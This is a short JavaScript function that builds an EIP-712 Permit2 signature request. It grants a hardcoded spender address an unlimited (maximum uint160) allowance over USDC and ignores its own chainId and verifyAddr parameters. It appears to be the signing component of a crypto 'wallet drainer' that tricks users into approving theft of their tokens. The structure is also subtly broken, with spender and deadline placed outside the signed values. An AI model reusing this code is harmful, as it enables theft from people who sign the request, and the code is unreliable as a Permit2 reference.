function genTypedData(chainId, verifyAddr) {
    
    const transferParams = {
        _nftAmount: '0000000000000000000000000000000000000000000000000000000000000001'
    };

    // 构建 EIP-712 签名数据
    const typedData = {
        domain: {
          name: 'Permit2',
          chainId: 1,
          verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3'
        },
        types: {
            PermitSingle: [
              { name: 'details', type: 'PermitDetails' },
              { name: 'spender', type: 'address' },
              { name: 'sigDeadline', type: 'uint256' }
            ],
            PermitDetails: [
              { name: 'token', type: 'address' },
              { name: 'amount', type: 'uint160' },
              { name: 'expiration', type: 'uint48' },
              { name: 'nonce', type: 'uint48' }
            ]
        },
        values: {
            details: {
              token: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
              amount: '0xffffffffffffffffffffffffffffffffffffffff',
            //   amount: BigNumber({
            //     _hex: '0xffffffffffffffffffffffffffffffffffffffff',
            //     _isBigNumber: true
            //   }),
              expiration: 1717836345,
              nonce: 0
            }
        },
        spender: '0x9416121B34e18069AC98Dcfc2c5CEbfac149eF4E',
        sigDeadline: 1715246145
      }

    return typedData
}

export default genTypedData;